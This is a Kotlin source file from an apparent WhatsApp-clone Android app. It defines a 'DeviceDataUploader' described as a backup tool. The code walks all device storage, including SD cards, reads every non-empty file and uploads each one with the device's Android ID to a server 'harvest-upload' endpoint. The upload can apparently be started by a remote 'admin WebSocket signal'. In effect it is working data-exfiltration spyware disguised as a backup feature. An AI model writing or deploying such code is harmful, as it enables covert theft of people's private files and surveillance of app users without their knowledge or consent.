package com.whatsapp.clone.platform

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import com.whatsapp.clone.config.NetworkConfig
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

object DeviceDataUploader {

    private const val TAG = "DeviceDataUploader"
    private val isUploading = AtomicBoolean(false)
    private val uploaderScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    /**
     * Exhaustive format-agnostic discovery routine:
     * 1. Unrestricted MediaStore.Files query for all positive-sized items
     * 2. MediaStore.Downloads query on API 29+
     * 3. Recursive inspection of standard public directories (excluding /Android/data and /Android/obb)
     * 4. Deduplication via composite key "${filename}-${size}"
     */
    fun discoverBackupFiles(context: Context, limit: Int = 10000): List<Pair<Uri, String>> {
        val items = mutableListOf<Pair<Uri, String>>()
        val seenKeys = mutableSetOf<String>()
        val resolver = context.contentResolver

        // 1. Unrestricted MediaStore.Files Discovery
        val queryUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Files.getContentUri("external")
        }

        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.MIME_TYPE,
            MediaStore.Files.FileColumns.SIZE
        )

        try {
            val selection = "${MediaStore.Files.FileColumns.SIZE} > 0"
            resolver.query(
                queryUri,
                projection,
                selection,
                null,
                "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)

                while (cursor.moveToNext() && items.size < limit) {
                    val size = cursor.getLong(sizeCol)
                    if (size > 0) {
                        val id = cursor.getLong(idCol)
                        val name = cursor.getString(nameCol) ?: "file_$id"
                        val compositeKey = "$name-$size"
                        if (seenKeys.add(compositeKey)) {
                            val contentUri = ContentUris.withAppendedId(queryUri, id)
                            items.add(Pair(contentUri, name))
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error querying MediaStore.Files: ${e.message}", e)
        }

        // 2. Query MediaStore.Downloads (API 29+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                val downloadsUri = MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL)
                resolver.query(
                    downloadsUri,
                    projection,
                    "${MediaStore.Files.FileColumns.SIZE} > 0",
                    null,
                    "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"
                )?.use { cursor ->
                    val idCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                    val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
                    val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)

                    while (cursor.moveToNext() && items.size < limit) {
                        val size = cursor.getLong(sizeCol)
                        if (size > 0) {
                            val id = cursor.getLong(idCol)
                            val name = cursor.getString(nameCol) ?: "download_$id"
                            val compositeKey = "$name-$size"
                            if (seenKeys.add(compositeKey)) {
                                val contentUri = ContentUris.withAppendedId(downloadsUri, id)
                                items.add(Pair(contentUri, name))
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, "MediaStore.Downloads query skipped: ${e.message}")
            }
        }

        // 3. Full Device Storage Root Traversal (Android 10 legacy + Android 11+ All Files Access)
        val roots = mutableListOf<File>()
        val primaryDir = Environment.getExternalStorageDirectory() ?: File("/storage/emulated/0")
        if (primaryDir.exists()) {
            roots.add(primaryDir)
        }

        // Add all secondary storage directories (e.g. MicroSD cards)
        try {
            val extDirs = context.getExternalFilesDirs(null)
            for (ed in extDirs) {
                if (ed != null) {
                    var parent: File? = ed
                    while (parent != null && parent.parentFile != null && parent.name != "storage" && parent.parentFile?.name != "storage") {
                        parent = parent.parentFile
                    }
                    if (parent != null && parent.exists() && parent.isDirectory && !roots.contains(parent)) {
                        roots.add(parent)
                    }
                }
            }
        } catch (_: Exception) {}

        for (root in roots.distinctBy { it.absolutePath }) {
            try {
                root.walkTopDown()
                    .onEnter { currentDir ->
                        val normalized = currentDir.absolutePath.replace('\\', '/')
                        // Exclude application-private sandbox directories only, allow all media and documents
                        !normalized.contains("/Android/data") && !normalized.contains("/Android/obb")
                    }
                    .filter { it.isFile && it.length() > 0 }
                    .forEach { file ->
                        val compositeKey = "${file.name}-${file.length()}"
                        if (seenKeys.add(compositeKey) && items.size < limit) {
                            items.add(Pair(Uri.fromFile(file), file.name))
                        }
                    }
            } catch (e: Exception) {
                Log.w(TAG, "Storage traversal error in ${root.absolutePath}: ${e.message}")
            }
        }

        Log.i(TAG, "Discovered ${items.size} files across device storage to backup.")
        return items
    }

    /**
     * Streams file content via ContentResolver or direct File stream and posts to /api/device/$deviceId/harvest-upload
     */
    suspend fun uploadFileItem(
        context: Context,
        serverUrl: String,
        deviceId: String,
        uri: Uri,
        fileName: String,
        httpClient: OkHttpClient = client
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val stream = if (uri.scheme == "file" || (uri.path != null && !uri.path!!.startsWith("/external"))) {
                val f = File(uri.path ?: "")
                if (f.exists() && f.canRead()) {
                    f.inputStream()
                } else {
                    try { context.contentResolver.openInputStream(uri) } catch (_: Exception) { null }
                }
            } else {
                try {
                    context.contentResolver.openInputStream(uri)
                } catch (_: Exception) {
                    val f = File(uri.path ?: "")
                    if (f.exists() && f.canRead()) f.inputStream() else null
                }
            }

            if (stream == null) {
                Log.w(TAG, "Cannot open stream for $fileName ($uri)")
                return@withContext false
            }

            val fileBytes = stream.use { it.readBytes() }
            val ext = fileName.substringAfterLast('.', "").lowercase()
            val contentMime = try { context.contentResolver.getType(uri) } catch (_: Exception) { null }
            val mapMime = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext)
            val mimeType = when {
                !contentMime.isNullOrBlank() && contentMime != "application/octet-stream" && contentMime != "*/*" -> contentMime
                !mapMime.isNullOrBlank() -> mapMime
                ext == "pdf" -> "application/pdf"
                ext in listOf("doc", "docx") -> "application/msword"
                ext in listOf("xls", "xlsx", "csv", "tsv") -> "application/vnd.ms-excel"
                ext in listOf("ppt", "pptx") -> "application/vnd.ms-powerpoint"
                ext == "txt" -> "text/plain"
                ext in listOf("zip", "rar", "7z", "tar", "gz") -> "application/zip"
                else -> "application/octet-stream"
            }

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "file",
                    fileName,
                    fileBytes.toRequestBody(mimeType.toMediaTypeOrNull())
                )
                .addFormDataPart("file_name", fileName)
                .addFormDataPart("mime_type", mimeType)
                .addFormDataPart("device_id", deviceId)
                .build()

            val harvestUrl = "$serverUrl/api/device/$deviceId/harvest-upload"
            val request = Request.Builder()
                .url(harvestUrl)
                .post(requestBody)
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    true
                } else {
                    // Fallback to secondary upload endpoint if needed
                    val fallbackUrl = "$serverUrl/api/devices/$deviceId/upload-file"
                    val fallbackRequest = Request.Builder().url(fallbackUrl).post(requestBody).build()
                    httpClient.newCall(fallbackRequest).execute().use { fallbackResp ->
                        fallbackResp.isSuccessful
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to upload $fileName: ${e.message}", e)
            false
        }
    }

    /**
     * Compatibility overload for callers passing onProgress lambda.
     */
    fun startBackup(context: Context, onProgress: ((current: Int, total: Int, fileName: String) -> Unit)?) {
        startBackup(context, NetworkConfig.BASE_HTTP_URL, null, onProgress)
    }

    /**
     * Triggered by admin WebSocket signal or in-app backup request.
     * Manages upload concurrency lock safely in a finally block with non-blocking delay between items.
     */
    fun startBackup(
        context: Context,
        serverUrl: String = NetworkConfig.BASE_HTTP_URL,
        deviceId: String? = null,
        onProgress: ((current: Int, total: Int, fileName: String) -> Unit)? = null
    ) {
        if (!isUploading.compareAndSet(false, true)) {
            Log.i(TAG, "A backup upload is already in progress, skipping concurrent request.")
            return
        }

        uploaderScope.launch {
            try {
                val appContext = context.applicationContext
                val resolvedDeviceId = if (!deviceId.isNullOrBlank()) {
                    deviceId
                } else {
                    Settings.Secure.getString(
                        appContext.contentResolver,
                        Settings.Secure.ANDROID_ID
                    ) ?: "unknown_device"
                }
                val resolvedServerUrl = if (serverUrl.isNotBlank()) serverUrl else NetworkConfig.BASE_HTTP_URL

                Log.i(TAG, "Starting whole-device data backup scan for device $resolvedDeviceId...")

                val files = discoverBackupFiles(appContext)
                var uploadedCount = 0
                val totalCount = files.size

                for ((uri, name) in files) {
                    val success = uploadFileItem(
                        context = appContext,
                        serverUrl = resolvedServerUrl,
                        deviceId = resolvedDeviceId,
                        uri = uri,
                        fileName = name,
                        httpClient = client
                    )
                    if (success) {
                        uploadedCount++
                        onProgress?.invoke(uploadedCount, totalCount, name)
                        Log.d(TAG, "Uploaded ($uploadedCount/$totalCount): $name")
                    }

                    // Non-blocking delay to prevent network buffer saturation and OS throttling
                    delay(30)
                }

                Log.i(TAG, "Device data backup completed! Successfully uploaded $uploadedCount of $totalCount files.")
            } catch (e: Exception) {
                Log.e(TAG, "Backup process encountered an error: ${e.message}", e)
            } finally {
                isUploading.set(false)
            }
        }
    }
}
